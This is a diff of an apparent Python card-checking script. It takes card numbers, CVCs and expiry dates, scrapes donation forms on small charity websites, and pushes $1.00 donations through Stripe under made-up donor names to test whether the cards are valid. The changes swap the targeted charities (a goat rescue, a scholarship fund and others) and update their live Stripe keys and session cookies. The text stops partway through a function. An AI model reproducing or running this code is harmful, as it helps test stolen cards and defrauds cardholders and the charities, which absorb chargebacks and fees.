@@ -693,7 +693,7 @@ def go3(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://moffittlegacyfoundation.org/give/', headers=headers)
+        response = requests.get('https://mariavillegoatfarm.com/rescue-re-home-2/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -721,7 +721,7 @@ def go3(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F9390d43c1d%3B+stripe-js-v3%2F9390d43c1d%3B+card-element&referrer=https%3A%2F%2Fmoffittlegacyfoundation.org&time_on_page=20929&client_attribution_metadata[client_session_id]=82f8cd5d-08cf-48a0-837f-9f5768089e71&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Qn25AKOe28Np3cyqzOlt9G23838aZejSaGl8TI2K5jI4s56jghH15bMCFr8JWgwIjUrLHqFCILKmpYvNOVHexn3007aNZ9jsH'
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=US&billing_details[address][postal_code]=10002&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F384cf3d9a5%3B+stripe-js-v3%2F384cf3d9a5%3B+card-element&referrer=https%3A%2F%2Fmariavillegoatfarm.com&time_on_page=36084&client_attribution_metadata[client_session_id]=888688d9-b58d-4721-b053-ca4658d672a4&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51SQ7iV6ecTk35N53Z71eP1WplGFNmxgih7mmkn7txwoQFhBs8OoRLW4Se3SbkwPY4XCoHLN3xZ1dd8BXLi68U36E004Z7FsTIp'
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
         pm = res_json.get('id')
@@ -732,68 +732,66 @@ def go3(cc_input: str) -> str:
                 
         #3
         cookies = {
-    '_ga': 'GA1.1.1745641487.1764277891',
-    '__stripe_mid': '1565da00-12ba-41c0-bfb5-093c8235799aa80493',
-    'charitable_session': 'cadcb16531e05f3bcf03fbfe5b24a69e||86400||82800',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-12-08%2005%3A12%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fmoffittlegacyfoundation.org%2Fgive%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2025-12-08%2005%3A12%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fmoffittlegacyfoundation.org%2Fgive%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmoffittlegacyfoundation.org%2Fgive%2F',
-    '__stripe_sid': 'b5d877f1-e69c-49db-9fe9-029207360087a8d038',
-    '_ga_KFPPM0S0M8': 'GS2.1.s1765172534$o2$g0$t1765172538$j56$l0$h0',
+            '_ga': 'GA1.1.717020559.1767342592',
+            '__stripe_mid': '9c34670f-f8f5-46bd-8cc6-529245815c23f6b040',
+            '__cf_bm': 'ifMKXr71XepkIx4Fu50ANLWPO3uMWODsxglolQCnUd0-1767955925-1.0.1.1-4QnNA2BELGOuy2pjx7qLaoRNAa5HARNjDuNmSlzYQKoT5kjZVcT3v6qjvfM5KAIDF45jtZThXzJVMCJSbsP2D9ZkGazSOL6vSFle13KU5hU',
+            'charitable_session': 'ab50922ed13725fa6f70a129904db9e9||86400||82800',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2026-01-09%2010%3A52%3A09%7C%7C%7Cep%3Dhttps%3A%2F%2Fmariavillegoatfarm.com%2Frescue-re-home-2%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+            'sbjs_first_add': 'fd%3D2026-01-09%2010%3A52%3A09%7C%7C%7Cep%3Dhttps%3A%2F%2Fmariavillegoatfarm.com%2Frescue-re-home-2%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+            'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
+            'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmariavillegoatfarm.com%2Frescue-re-home-2%2F',
+            '_ga_03238J493R': 'GS2.1.s1767955929$o2$g0$t1767955929$j60$l0$h0',
+            '__stripe_sid': 'ce59c854-060b-434c-8afa-5eb466e480e09aac52',
         }
+        
         headers = {
-    'authority': 'moffittlegacyfoundation.org',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://moffittlegacyfoundation.org',
-    'pragma': 'no-cache',
-    'referer': 'https://moffittlegacyfoundation.org/give/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': user,
-    'x-requested-with': 'XMLHttpRequest',
+            'authority': 'mariavillegoatfarm.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': '_ga=GA1.1.717020559.1767342592; __stripe_mid=9c34670f-f8f5-46bd-8cc6-529245815c23f6b040; __cf_bm=ifMKXr71XepkIx4Fu50ANLWPO3uMWODsxglolQCnUd0-1767955925-1.0.1.1-4QnNA2BELGOuy2pjx7qLaoRNAa5HARNjDuNmSlzYQKoT5kjZVcT3v6qjvfM5KAIDF45jtZThXzJVMCJSbsP2D9ZkGazSOL6vSFle13KU5hU; charitable_session=ab50922ed13725fa6f70a129904db9e9||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-09%2010%3A52%3A09%7C%7C%7Cep%3Dhttps%3A%2F%2Fmariavillegoatfarm.com%2Frescue-re-home-2%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2026-01-09%2010%3A52%3A09%7C%7C%7Cep%3Dhttps%3A%2F%2Fmariavillegoatfarm.com%2Frescue-re-home-2%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmariavillegoatfarm.com%2Frescue-re-home-2%2F; _ga_03238J493R=GS2.1.s1767955929$o2$g0$t1767955929$j60$l0$h0; __stripe_sid=ce59c854-060b-434c-8afa-5eb466e480e09aac52',
+            'origin': 'https://mariavillegoatfarm.com',
+            'referer': 'https://mariavillegoatfarm.com/rescue-re-home-2/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
         }
+        
         data = {
-    'charitable_form_id': f'{form_id}',
-    f'{form_id}': '',
-    '_charitable_donation_nonce': f'{donation_nonce}',
-    '_wp_http_referer': '/give/',
-    'campaign_id': f'{campaign_id}',
-    'description': 'Texas Hill Country Flood Relief',
-    'ID': f'{donation_id}',
-    'gateway': 'stripe',
-    'donation_amount': 'custom',
-    'custom_donation_amount': '1.00',
-    'first_name': 'Tiana',
-    'last_name': 'Jakubowski',
-    'email': email,
-    'address': '24 George Street',
-    'address_2': '',
-    'city': 'Racie',
-    'state': 'New South Walet',
-    'postcode': '2000',
-    'country': 'AU',
-    'phone': '+61290123456',
-    'stripe_payment_method': f'{pm}',
-    'action': 'make_donation',
-    'form_action': 'make_donation',
+            'charitable_form_id': f'{form_id}e',
+            f'{form_id}e': '',
+            '_charitable_donation_nonce': f'{donation_nonce}',
+            '_wp_http_referer': '/rescue-re-home-2/',
+            'campaign_id': f'{campaign_id}',
+            'description': 'Goatie Support',
+            'ID': f'{donation_id}',
+            'donation_amount': 'custom',
+            'custom_donation_amount': '1.00',
+            'first_name': 'Gen',
+            'last_name': 'Paypal',
+            'email': email,
+            'address': '',
+            'address_2': '',
+            'city': '',
+            'state': '',
+            'postcode': '',
+            'country': 'US',
+            'phone': '',
+            'gateway': 'stripe',
+            'stripe_payment_method': f'{pm}',
+            'action': 'make_donation',
+            'form_action': 'make_donation',
         }
-        response = requests.post(
-    'https://moffittlegacyfoundation.org/wp-admin/admin-ajax.php',
-    cookies=cookies,
-    headers=headers,
-    data=data,#, proxies=proxy, timeout=30)    
-        )
+        
+        response = requests.post('https://mariavillegoatfarm.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -830,7 +828,7 @@ def go3(cc_input: str) -> str:
             data = {
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
-    'key': 'pk_live_51Qn25AKOe28Np3cyqzOlt9G23838aZejSaGl8TI2K5jI4s56jghH15bMCFr8JWgwIjUrLHqFCILKmpYvNOVHexn3007aNZ9jsH',
+    'key': 'pk_live_51SQ7iV6ecTk35N53Z71eP1WplGFNmxgih7mmkn7txwoQFhBs8OoRLW4Se3SbkwPY4XCoHLN3xZ1dd8BXLi68U36E004Z7FsTIp',
     'client_secret': full_secret,
             }
             response = requests.post(
@@ -1658,7 +1656,7 @@ def go8(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://gods-dna.com/campaigns/donate-clothing-blankets-household-goods-etc/donate/', headers=headers)
+        response = requests.get('https://removecox.com/campaigns/remove-cox/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -1685,7 +1683,7 @@ def go8(cc_input: str) -> str:
             'user-agent': user,
         }
         
-        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=US&billing_details[address][postal_code]=&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fgods-dna.com&time_on_page=31687&client_attribution_metadata[client_session_id]=b7898d10-3066-4d12-b150-d3ee91400645&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51P5cEKLPKIuFJVL21f177uGwZrTmpfiNidDlHNtbaOpcXEUTmDB5ibBvKW5O37ahAyfBzuTNQ4QiAJHn3BLmmBTx00ja35XFdT'
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=27+Allen+St&billing_details[address][postal_code]=10002&billing_details[address][state]=New+York&billing_details[phone]=4303000850&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F384cf3d9a5%3B+stripe-js-v3%2F384cf3d9a5%3B+card-element&referrer=https%3A%2F%2Fremovecox.com&time_on_page=53835&client_attribution_metadata[client_session_id]=cf047f82-6534-4765-80da-2fb074a63692&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51MWjqOBCdNELOI2Gk06jlbFRB3FcAjpsUmcfxAWnvPiGyPtssLVYxznyZjd6XgLgeio7tuPASBHMqqfXz5N8jho900qDUs8ISN'
         
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
@@ -1697,30 +1695,23 @@ def go8(cc_input: str) -> str:
                 
         #3
         cookies = {
-            'charitable_session': '2e870f0b15b7ec8b7517e12588c9ee59||86400||82800',
-            'sbjs_migrations': '1418474375998%3D1',
-            'sbjs_current_add': 'fd%3D2025-12-29%2004%3A40%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-            'sbjs_first_add': 'fd%3D2025-12-29%2004%3A40%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-            'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-            'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
-            'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F',
-            'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
-            'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
-            'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
-            'tk_ai': 'HVibdSc+HF3H/QFkrPiTYiXR',
-            '__stripe_mid': '28300acb-8ef7-4687-b261-61418c999a5bad3f06',
-            '__stripe_sid': '2a24d694-d1fd-4a90-9899-5072d90ccd6ae3ded2',
+            'PHPSESSID': '9mfl81tncebrtn9rcogfosfuqf',
+            'charitable_session': 'e16fe844f66cde01e83da9b6de31403f||86400||82800',
+            '_gcl_au': '1.1.896325592.1767956082',
+            '_ga': 'GA1.1.963276245.1767956082',
+            '__stripe_mid': '27fb15c5-7315-4ec7-ad41-0ce2d661d0497c73e8',
+            '__stripe_sid': '65d4466e-8c08-437e-bf45-c294434397ea4a8635',
+            '_ga_00BJ0VC5TZ': 'GS2.1.s1767956082$o1$g0$t1767956088$j54$l0$h0',
         }
         
         headers = {
-            'authority': 'gods-dna.com',
+            'authority': 'removecox.com',
             'accept': 'application/json, text/javascript, */*; q=0.01',
             'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            # 'cookie': 'charitable_session=2e870f0b15b7ec8b7517e12588c9ee59||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-29%2004%3A40%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-12-29%2004%3A40%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fdonate-clothing-blankets-household-goods-etc%2Fdonate%2F; tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; tk_ai=HVibdSc+HF3H/QFkrPiTYiXR; __stripe_mid=28300acb-8ef7-4687-b261-61418c999a5bad3f06; __stripe_sid=2a24d694-d1fd-4a90-9899-5072d90ccd6ae3ded2',
-            'origin': 'https://gods-dna.com',
-            'referer': 'https://gods-dna.com/campaigns/donate-clothing-blankets-household-goods-etc/donate/',
+            # 'cookie': 'PHPSESSID=9mfl81tncebrtn9rcogfosfuqf; charitable_session=e16fe844f66cde01e83da9b6de31403f||86400||82800; _gcl_au=1.1.896325592.1767956082; _ga=GA1.1.963276245.1767956082; __stripe_mid=27fb15c5-7315-4ec7-ad41-0ce2d661d0497c73e8; __stripe_sid=65d4466e-8c08-437e-bf45-c294434397ea4a8635; _ga_00BJ0VC5TZ=GS2.1.s1767956082$o1$g0$t1767956088$j54$l0$h0',
+            'origin': 'https://removecox.com',
+            'referer': 'https://removecox.com/campaigns/remove-cox/',
             'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -1735,28 +1726,28 @@ def go8(cc_input: str) -> str:
             'charitable_form_id': f'{form_id}',
             f'{form_id}': '',
             '_charitable_donation_nonce': f'{donation_nonce}',
-            '_wp_http_referer': '/campaigns/donate-clothing-blankets-household-goods-etc/donate/',
+            '_wp_http_referer': '/campaigns/remove-cox/',
             'campaign_id': f'{campaign_id}',
-            'description': 'Donate Clothing, Blankets, Household Goods, etc.',
+            'description': 'Remove Cox',
             'ID': f'{donation_id}',
             'gateway': 'stripe',
+            'donation_amount': 'custom',
             'custom_donation_amount': '1.00',
             'first_name': 'Gen',
             'last_name': 'Paypal',
             'email': email,
-            'address': '',
-            'address_2': '',
-            'city': '',
-            'state': '',
-            'postcode': '',
+            'address': '27 Allen St',
+            'city': 'New York',
+            'state': 'New York',
+            'postcode': '10002',
             'country': 'US',
-            'phone': '',
+            'phone': '4303000850',
             'stripe_payment_method': f'{pm}',
             'action': 'make_donation',
             'form_action': 'make_donation',
         }
         
-        response = requests.post('https://gods-dna.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+        response = requests.post('https://removecox.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -1793,7 +1784,7 @@ def go8(cc_input: str) -> str:
             data = {
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
-    'key': 'pk_live_51P5cEKLPKIuFJVL21f177uGwZrTmpfiNidDlHNtbaOpcXEUTmDB5ibBvKW5O37ahAyfBzuTNQ4QiAJHn3BLmmBTx00ja35XFdT',
+    'key': 'pk_live_51MWjqOBCdNELOI2Gk06jlbFRB3FcAjpsUmcfxAWnvPiGyPtssLVYxznyZjd6XgLgeio7tuPASBHMqqfXz5N8jho900qDUs8ISN',
     'client_secret': full_secret,
             }
             response = requests.post(
@@ -2597,7 +2588,7 @@ def go13(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://gods-dna.com/campaigns/save-water-initiative/donate/', headers=headers)
+        response = requests.get('https://auseducationscholarshipfund.com/Fundraising-campaign/empowering-women-scholarship/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -2624,7 +2615,7 @@ def go13(cc_input: str) -> str:
             'user-agent': user,
         }
         
-        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=US&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fgods-dna.com&time_on_page=28471&client_attribution_metadata[client_session_id]=514a366d-9ca6-4a33-928c-85702c430cbb&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51P5cEKLPKIuFJVL21f177uGwZrTmpfiNidDlHNtbaOpcXEUTmDB5ibBvKW5O37ahAyfBzuTNQ4QiAJHn3BLmmBTx00ja35XFdT'
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=AU&billing_details[address][postal_code]=10002&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F384cf3d9a5%3B+stripe-js-v3%2F384cf3d9a5%3B+card-element&referrer=https%3A%2F%2Fauseducationscholarshipfund.com&time_on_page=77216&client_attribution_metadata[client_session_id]=249f122e-3e48-4c44-b35e-d065e113306e&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51N0c3wFu9PrY1RQZncVecs6WwgAUS2zFFExpZnB7jnbuQrUQp08roqVZXgEnOidrsiqwhnm1FvPl3jIxYsiSWrw100B2nmJyOO'
         
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
@@ -2636,30 +2627,27 @@ def go13(cc_input: str) -> str:
                 
         #3
         cookies = {
-            'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
-            'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
-            'tk_ai': 'HVibdSc+HF3H/QFkrPiTYiXR',
-            '__stripe_mid': '28300acb-8ef7-4687-b261-61418c999a5bad3f06',
-            'charitable_session': '32f77a502efa2eb8a91d97ca3835b81c||86400||82800',
-            'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
-            '__stripe_sid': 'e45f54e9-5563-4c55-b832-2b650928c4a333fad8',
+            '__stripe_mid': '2a52e21d-40a7-4845-82b6-642ff1744f867fc01b',
+            'wpconsent_preferences': '{"essential":true,"statistics":true,"marketing":true}',
+            'charitable_session': 'bbef5a0d949eb28eb414c9bfbd5b8421||86400||82800',
             'sbjs_migrations': '1418474375998%3D1',
-            'sbjs_current_add': 'fd%3D2026-01-02%2009%3A38%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-            'sbjs_first_add': 'fd%3D2026-01-02%2009%3A38%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fgods-dna.com%2Fcampaigns%2Fsave-water-initiative%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+            'sbjs_current_add': 'fd%3D2026-01-09%2011%3A10%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fauseducationscholarshipfund.com%2FFundraising-campaign%2Fempowering-women-scholarship%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+            'sbjs_first_add': 'fd%3D2026-01-09%2011%3A10%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fauseducationscholarshipfund.com%2FFundraising-campaign%2Fempowering-women-scholarship%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
